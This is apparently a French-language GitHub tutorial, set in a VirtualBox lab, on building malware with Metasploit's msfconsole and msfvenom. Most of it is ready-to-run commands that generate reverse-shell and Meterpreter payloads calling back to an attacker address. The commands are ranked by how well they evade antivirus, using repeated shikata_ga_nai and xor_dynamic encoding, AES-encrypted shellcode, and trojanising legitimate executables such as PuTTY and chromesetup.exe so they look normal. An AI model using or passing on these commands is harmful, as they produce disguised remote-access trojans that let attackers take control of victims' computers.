# Les malwares

## Prérequis :
- virtual box
- kali linux dans virtual
- windows 10 dans virtual


## dans virtul box :

### dans la configuration de kali linux choisisez le reseau privé hote qui permettra de faire les commande tranquillementL.

<img width="1455" height="771" alt="image" src="https://github.com/user-attachments/assets/60365132-93fa-4f21-ac70-2e24980db571" />


## voilà une architecture de metasploite


<img width="1277" height="722" alt="image" src="https://github.com/user-attachments/assets/6713005c-ec08-48f7-819e-ee17dfd5a26c" />

## nous utiliserons msfconsole dans la console de kali linux dans virtual box en mode root :

<img width="1282" height="723" alt="image" src="https://github.com/user-attachments/assets/c60cd0f7-662b-4324-ad2a-2676bf5e0b9b" />

## commande pour lancer msfconsole :  

```bash
service postgresql start §§ apach2 start
msfdb init
msfconsole
```

### normalement vous avez ceci 

<img width="595" height="816" alt="image" src="https://github.com/user-attachments/assets/3f89b84b-abe9-40b9-a975-955ef7515b2f" />



## explication :

les exploits sont des codes malicieux permettant de détourner le fonctionement d'un programme à partir d'une vulnérabilité  

les auxilaires sont des outils permettant de scanner des systèmes , ce qui permettra de découvrir des ports, des services et des vulnérabilités  

les posts servent à la recherche d'information comme les mots de passe ,les dossiers d'une cible et d'autres informations   

les playload sont des codes malveillant que l'on injecte sur la cible en fonction de son architecture afin d'établir une connexion distante   

les encoders nous permettrons de dissimuler nos playload afin d'être le moins détecté par les systèmes de notre cible

les nops sont des structures par défaut qui permettront de faire fonctionner nos codes malveillants selon les plateformes (web = comment le site est fait,pc= système d exploitation,téléphone=os)

les evasions permmettent de générer des playload quasi indétectable par la grande majorité des anti virus

### après le lancement de msfconsole taper:

````bash
help
````

## explication :

### section core commande :
inserer des commandes de base pour faire des recherches

### section module commande :
obtenir des informations specifiques

### section job commande :
interagir avec un systeme 

### section ressource script commande :
permet d'ajouter nos scripts à nos tests d'intrusion

### section databse backend commande :
permet de faire de la reconnaissance sur nos cibles

### section credential backend commande :
renseigne sur l idendité sur nos cibles

### section developper commande :
possede les attribue de modification

### section dns commande :
Gérer le comportement de résolution DNS de Metasploit

### section msfconsole :
simple description

###  je vous ai expliquez les section des commande , pour toutes les commande la description se trouve a cote dans l interface consol msfconsole 
 ## exemple:

 <img width="1920" height="922" alt="image" src="https://github.com/user-attachments/assets/2b809094-d5d6-41f1-8edd-e9c96c66e064" />
 

### je vais vous montrer comment faire des playload alors tout d abord qu est ce que c est des playload exactement 🤔 :

<img width="1280" height="718" alt="Capture d&#39;écran 2026-09-03 185758" src="https://github.com/user-attachments/assets/e8dc22d7-8e1e-4667-be57-02df2fa4e3e9" />

# generer un playload :

### commande a taper :

````bash
use PAYLOAD/
````

### vous verrez des milliers de champs qui vous ferront mal au crane (oui j ai eut mal -__-)

taper juste cette commande :

````bash
use payload/windows/x64/shell_reverse_tcp
````
il va creer  un shell Windows via une connexion TCP inverse.

# A partir de maintenant  toutes les commande ici serviront a comprendre le fonctionnement des malawrs car en une seul ligne cela suffit a creer le malwar.

regarder les option : 

````bash
options
````
ouvrez un nouveau terminal et taper :

````bash
ifconfig
````
## ensuite :

### taper cette commande pour presiser votre adresse ip (remplacer mon ip par la votre )

````bash$
set Lhost 192.168.56.101
set LPORT 6000
````
## puis :
### taper cette commande pour avoir les commande et parametre possible a mettre sur votre playload :

````bash
generate -h
````
## puis on va generer le playload :

````bash
generate -b \x00\xff
````
## puis on va choisir l encoder du playload :

````bash
generate -h
show encoders
````
## encodons en shikataganai !:

````bash
generate -e x86/shikata_ga_nai
````

## ajouton l option binaire :

````bash
generate -e x86/shikata_ga_nai -b \xff
````

## format powershell :

````bash
generate -e x86/shikata_ga_nai -b \xff -f powershell
````

## format bat :

````bash
generate -e x86/shikata_ga_nai -b \xff -f bat
````

## double iteration pour rendre la lecture du code plus difficile :

````bash
generate -e x86/shikata_ga_nai -b \xff -i 2 -f powershell
````

ajouter un chemin de fichier pour creer le fichier :

````bash
generate -e x86/shikata_ga_nai -b \xff -i 2 -o /home/kali/Desktop/fichier.exe -f powershell
````
format exe malwar complet en une ligne :

````bash
generate -e x86/shikata_ga_nai -b \xff -i 2 -o /home/kali/Desktop/fichier.exe -f exe
````

## c est fini on peut toujours rajouter plus d iteration y a d autre format , encoder, forme,option ,playload,module possible explorer tout 👍

# maintenant nous allons utiliser msfvemon , tout d abord comprenons ce que c est :

<img width="1277" height="718" alt="image" src="https://github.com/user-attachments/assets/a23ff33c-6aea-44f4-9b44-0db65c87a241" />

## explication :

msfvemon est comme msfconsol ,nous avons pu voir seulement le module playload et encoder mais il en exisit 6 alors que msfvemon est concentrer que sur les playload et encoder on peut penser c bien mais oublier les menu chouette avec plein de chois les commande show encoder et option il n y a que deux commande pour vous aider  comme sur l image 
sinon msfvenom se base sur les meme commande que msfconsol

## tout d abord la commande pour avoir les option et parametre qui vont accompagner votre playload :

````bash
msfvenom -h
````

### personelement je trouve les menu de msfvenom complet illisible et nul mais sa simplicity en fait son avantage

<img width="1920" height="922" alt="image" src="https://github.com/user-attachments/assets/4094e6bc-dde9-42fc-9b66-af0227b7812e" />


## puis la commande pour tous les playload et encoder :

````bash
msfvenom -lall
````
<img width="1920" height="922" alt="image" src="https://github.com/user-attachments/assets/59b7542a-6fd2-4e57-8b92-284edda559f9" />

### apres si vous connaissait bien les commande en 10 seconde votre malwar est fait pour n import quel cible , c est la puissance de msfvenom


exemple(remplacer votre ip,le port que vous voulez , votre chemin,le nom de fichier, un autre parametre comme -e avec de l encoding ,une option binaire...etc) :

````bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=4444 -e x86/shikata_ga_nai -b "\x00" -f python
````
````bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows --arch x86 -f exe lhost=192.168.56.101 lport=8000 -o /home/kali/Desktop/fichier.exe
````
````bash
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7000 -f raw > /home/kali/Desktop/shell.php
````

## dans virtual box :

### dans kali linux changer la configuration du reseau en acces par pont , cela permettra de telechargerdes ressource a infecter, vous pourrez inserrez votre malwar dans un vrai exe connu comme chromesetup.exe. vous serrez le plus discret avec les anti virus en vous faisant passer pour un executable tout a fait normal ( en conservant sa signature)

<img width="1392" height="733" alt="image" src="https://github.com/user-attachments/assets/8f901a2e-b4c9-4794-b8e1-8bd1ea27088a" />


---

## TABLEAU COMPLET DES COMMANDES MSFVENOM

### LÉGENDE DES OPTIONS

| Option | Signification | Exemple |
|--------|---------------|---------|
| `-p` | Payload à utiliser | `-p windows/x64/meterpreter_reverse_tcp` |
| `-f` | Format de sortie | `-f exe`, `-f raw`, `-f python`, `-f csharp` |
| `-e` | Encodeur à utiliser | `-e x86/shikata_ga_nai` |
| `-i` | Nombre d'itérations | `-i 10` (10 passes d'encodage) |
| `-x` | Template (fichier à infecter) | `-x /root/putty.exe` |
| `-k` | Garde le comportement du template | `-k` (le template s'exécute normalement) |
| `-b` | Caractères à éviter | `-b "\x00\xff"` |
| `-o` | Fichier de sortie (CHEMIN) | `-o /home/kali/Desktop/payload.exe` |
| `--platform` | Plateforme cible | `--platform windows` |
| `-a` | Architecture | `-a x64` |
| `--smallest` | Génère le plus petit possible | `--smallest` |
| `-n` | Ajoute des NOP sled | `-n 32` (32 NOPs) |

---

##  COMMANDES MSFVENOM (Du moins puissant au plus puissant)

---

###  PAYLOAD BRUT (Sans encodage - Très détectable)

```bash
# Payload Windows 64-bit brut
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o /home/kali/Desktop/payload.exe
```

```bash
# Payload Windows 32-bit brut
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o /home/kali/Desktop/payload_x86.exe
```

```bash
# Payload Shell reverse brut
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o /home/kali/Desktop/shell.exe
```

---

###  AVEC ENCODAGE SHIKATA_GA_NAI (Moyennement détectable)

```bash
# Shikata_ga_nai 1 itération
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 1 -f exe -o /home/kali/Desktop/payload_shikata1.exe
```

```bash
# Shikata_ga_nai 5 itérations
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o /home/kali/Desktop/payload_shikata5.exe
```

```bash
# Shikata_ga_nai 10 itérations
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o /home/kali/Desktop/payload_shikata10.exe
```

```bash
# Shikata_ga_nai 20 itérations
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x86/shikata_ga_nai -i 20 -f exe -o /home/kali/Desktop/payload_shikata20.exe
```

---

### : AVEC XOR_DYNAMIC (Moins détectable que shikata)

```bash
# XOR_Dynamic 1 itération
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 1 -f exe -o /home/kali/Desktop/payload_xor1.exe
```

```bash
# XOR_Dynamic 10 itérations
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 10 -f exe -o /home/kali/Desktop/payload_xor10.exe
```

```bash
# XOR_Dynamic 20 itérations
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 20 -f exe -o /home/kali/Desktop/payload_xor20.exe
```

```bash
# XOR_Dynamic 30 itérations (très long à générer)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 30 -f exe -o /home/kali/Desktop/payload_xor30.exe
```

---

###  AVEC TEMPLATE (Fichier légitime) - MOINS DÉTECTABLE

```bash
# Putty + pas d'encodage
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -x /root/putty.exe -k -f exe -o /home/kali/Desktop/putty_payload.exe
```

```bash
# Putty + Shikata 5 itérations
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -x /root/putty.exe -k -e x86/shikata_ga_nai -i 5 -f exe -o /home/kali/Desktop/putty_shikata5.exe
```

```bash
# Putty + XOR_Dynamic 10 itérations
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -x /root/putty.exe -k -e x64/xor_dynamic -i 10 -f exe -o /home/kali/Desktop/putty_xor10.exe
```

---

###  TEMPLATE + HTTPS (Trafic chiffré) - TRÈS FURTIF

```bash
# Putty + HTTPS (trafic chiffré)
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=443 -x /root/putty.exe -k -e x64/xor_dynamic -i 10 -f exe -o /home/kali/Desktop/putty_https.exe
```

```bash
# Putty + HTTPS + 20 itérations (ULTIME)
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.56.101 LPORT=443 -x /root/putty.exe -k -e x64/xor_dynamic -i 20 -f exe -o /home/kali/Desktop/putty_ultimate.exe
```

---

###  DOUBLE ENCODAGE (Très difficile à détecter)

```bash
# Double encodage : XOR_Dynamic + Shikata
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x86/shikata_ga_nai -i 10 -f exe -o /home/kali/Desktop/double_encoded.exe
```

```bash
# Double encodage + Template Putty
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw | msfvenom -a x64 --platform windows -e x86/shikata_ga_nai -i 10 -x /root/putty.exe -k -f exe -o /home/kali/Desktop/double_encoded_putty.exe
```

---

###  AES CHIFFRÉ (Niveau Expert)

```bash
# Étape 1 : Générer le shellcode
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f raw -o /home/kali/Desktop/shellcode.bin
```
````bash
# Etape2 : Installer pycryptodome via APT
apt update && apt install python3-pycryptodome -y
```` 
```bash
# Étape 3: Chiffrer avec AES
python3 -c "
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

key = os.urandom(32)
iv = os.urandom(16)
with open('/home/kali/Desktop/shellcode.bin', 'rb') as f:
    data = f.read()
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(data, AES.block_size))
with open('/home/kali/Desktop/encrypted.bin', 'wb') as f:
    f.write(iv + encrypted)
print('Clé AES (hex):', key.hex())
"
````
je me suis beaucoup entrainer -__-
